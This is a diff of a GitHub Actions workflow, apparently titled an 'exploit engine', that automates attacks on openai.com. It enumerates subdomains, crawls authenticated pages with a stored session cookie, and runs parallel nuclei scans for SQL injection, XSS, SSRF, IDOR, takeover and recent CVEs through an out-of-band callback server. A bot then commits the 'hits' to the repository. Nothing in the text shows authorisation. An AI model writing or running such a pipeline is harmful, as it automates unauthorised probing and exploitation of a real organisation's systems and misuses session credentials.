@@ -1,4 +1,4 @@
-name: "Elite Parallel Exploit Engine 2026"
+name: "Elite Pari"
 
 on:
   schedule:
@@ -27,28 +27,27 @@ jobs:
           PDCP_API_KEY: ${{ secrets.PDCP_API_KEY }}
           COOKIE: ${{ secrets.OPENAI_COOKIE }}
         run: |
-          # Robust directory and file handling
           mkdir -p output
+          touch output/params.txt
           
-          if [ -f output/params.txt ]; then
-            mv output/params.txt output/params_old.txt
-          else
-            touch output/params_old.txt
-          fi
-          
-          # 1. Cloud-based discovery
+          # 1. Cloud-based discovery (Subdomains + Hidden IPs)
           subfinder -d openai.com -all -auth $PDCP_API_KEY -silent > subs.txt
           uncover -q "openai.com" -auth $PDCP_API_KEY -limit 300 >> subs.txt
           cat subs.txt | sort -u | httpx -silent -t 50 -o output/alive.txt
           
-          # 2. Authenticated Deep Crawl
-          katana -list output/alive.txt -jc -kf all -d 2 -H "Cookie: $COOKIE" -o output/params_new.txt || touch output/params_new.txt
+          # 2. Deep Crawling
+          touch output/params_new.txt
+          katana -list output/alive.txt -jc -kf all -d 2 -H "Cookie: $COOKIE" -o output/params_new.txt || echo "Katana skip"
           
-          # 3. Delta Logic: Only scan new items to save time
-          grep -vFf output/params_old.txt output/params_new.txt > output/to_scan.txt || cp output/params_new.txt output/to_scan.txt
+          # 3. Delta Logic: Identify NEW URLs only
+          if [ -s output/params_new.txt ]; then
+            grep -vFf output/params.txt output/params_new.txt > output/to_scan.txt || cp output/params_new.txt output/to_scan.txt
+          else
+            touch output/to_scan.txt
+          fi
           
-          # 4. Persistence Merge
-          cat output/params_old.txt output/params_new.txt | sort -u > output/params.txt
+          # Update master list
+          cat output/params.txt output/params_new.txt | sort -u > temp.txt && mv temp.txt output/params.txt
 
       - name: Save Recon Data
         uses: actions/upload-artifact@v4
@@ -62,6 +61,7 @@ jobs:
     strategy:
       fail-fast: false
       matrix:
+        # Each job handles a specific vulnerability class
         vuln_type: [sqli, xss, ssti, ssrf, idor, takeover, exposure]
     steps:
       - uses: actions/checkout@v4
@@ -70,34 +70,42 @@ jobs:
           name: targets
           path: output/
 
-      - name: Setup Nuclei
-        run: go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest && echo "$HOME/go/bin" >> $GITHUB_PATH
+      - name: Setup & Update Nuclei
+        run: |
+          go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
+          echo "$HOME/go/bin" >> $GITHUB_PATH
+          $HOME/go/bin/nuclei -ut # Force update templates to get 2025/2026 CVEs
 
-      - name: Parallel Attack Engine
+      - name: Advanced Vulnerability Scanning
         env:
           ISH_TOKEN: ${{ secrets.INTERACTSH_TOKEN }}
           PDCP_API_KEY: ${{ secrets.PDCP_API_KEY }}
           COOKIE: ${{ secrets.OPENAI_COOKIE }}
         run: |
-          # Using -v for validation to stop false positives
-          nuclei -l output/to_scan.txt \
-            -tags ${{ matrix.vuln_type }} \
-            -auth $PDCP_API_KEY \
-            -interactsh-server oast.fun \
-            -itoken $ISH_TOKEN \
-            -header "Cookie: $COOKIE" \
-            -header "X-Forwarded-For: 127.0.0.1" \
-            -rate-limit 120 \
-            -o output/hit_${{ matrix.vuln_type }}.txt
+          if [ -s output/to_scan.txt ]; then
+            # We add 'cve2025' and 'cve2026' tags to every scan
+            # This ensures we test for the newest unpatched flaws
+            nuclei -l output/to_scan.txt \
+              -tags ${{ matrix.vuln_type }},cve2025,cve2026,dast \
+              -auth $PDCP_API_KEY \
+              -interactsh-server oast.fun \
+              -itoken $ISH_TOKEN \
+              -header "Cookie: $COOKIE" \
+              -rate-limit 100 \
+              -bulk-size 15 \
+              -concurrency 30 \
+              -o output/hit_${{ matrix.vuln_type }}.txt
+          else
+            echo "No new targets."
+          fi
 
       - name: Atomic Save Findings
         run: |
           git config --local user.email "bot@hacker.ai"
           git config --local user.name "Exploit-Bot"
-          # Retry loop handles 7 jobs pushing to Git at once
           for i in {1..10}; do
             git pull origin main --rebase
-            git add output/
-            git commit -m "Vuln-Hit: ${{ matrix.vuln_type }} $(date)" && git push origin main && break || sleep 15
+            git add output/*.txt
+            git commit -m "2026 Scan Hit: ${{ matrix.vuln_type }} $(date)" && git push origin main && break || sleep 15
           done
           
